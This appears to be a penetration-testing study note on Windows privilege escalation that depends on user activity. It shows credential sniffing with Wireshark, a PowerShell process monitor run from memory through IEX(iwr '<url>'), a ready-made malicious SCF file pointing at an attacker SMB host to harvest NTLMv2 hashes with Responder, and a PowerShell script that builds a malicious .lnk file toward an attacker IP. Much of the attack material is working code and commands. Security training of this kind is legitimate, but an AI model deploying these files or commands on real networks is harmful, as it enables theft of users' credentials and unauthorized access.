Techniques that rely on user activity: sniffing network traffic, watching process command lines, attacking vulnerable services that need user interaction, and planting malicious files on busy file shares to capture password hashes to crack later.

## Traffic Capture

If `wireshark` is installed, unprivileged users may be able to capture network traffic, since the option to restrict `Npcap` driver access to Administrators only is not enabled by default during installation.

![[pcap.webp]]

We can use filters to find sensitive information. In the example below, we can see packets with credentials for an `FTP` server.

![[ftp.webp]]

>[!tip]
>If the client gives us an attack machine within an environment, we should run `wireshark` or `tcpdump` for a while to see if we find anything interesting. We can use [net-creds](https://github.com/DanMcInerney/net-creds) to search for passwords and hashes in a `pcap` file.

## Process Command Lines

When getting a shell, there may be scheduled tasks or other processes being executed which pass credentials on the command line. We can monitor for this using the following small `PowerShell` one-liner:

```powershell
while($true) { $process = Get-WmiObject Win32_Process | Select-Object CommandLine; Start-Sleep 1; $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine; Compare-Object -ReferenceObject $process -DifferenceObject $process2 }
```

We can run it from memory like this:

```shell
IEX(iwr '<url>')
```

We should let it run for some time to gather everything we can.

## Vulnerable Services

There are some vulnerabilities that can be used to escalate privileges, but require user interaction. We could leave a malicious exploit and check periodically if our privileges are elevated because someone ran the executable.

## SCF on a File Share

A Shell Command File (`SCF`) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An `SCF` file can be manipulated to have the icon file location point to a specific `UNC` path (`\\<host>\<path>`) and have Windows Explorer start an `SMB` session when the folder where the `.scf` file resides is accessed. We can steal `NTLMv2` password hashes by changing the `IconFile` to an `SMB` server we control, like the one from `responder`, which will also show us the hashes.

We can create a file with a name like `@Inventory.scf`. We put an `@` at the start so it appears at the top of the directory to ensure it's seen and executed by Windows Explorer as soon as the user accesses the share.

```scf
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[TaskBar]
Command=ToggleDesktop
```

```shell
sudo responder -I tun0
```

And then crack with `hashcat` mode 5600 for `NTLMv2`.

## Capturing Hashes with Malicious `.lnk` File

Using `SCF`s no longer works on Server 2019 hosts, but we can achieve the same with `.lnk` files. It's not as straightforward as an `.scf`. We can create one with `PowerShell`:

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\shortcut.lnk")
$lnk.TargetPath = "\\<attackerIP>\@icon.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Description"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```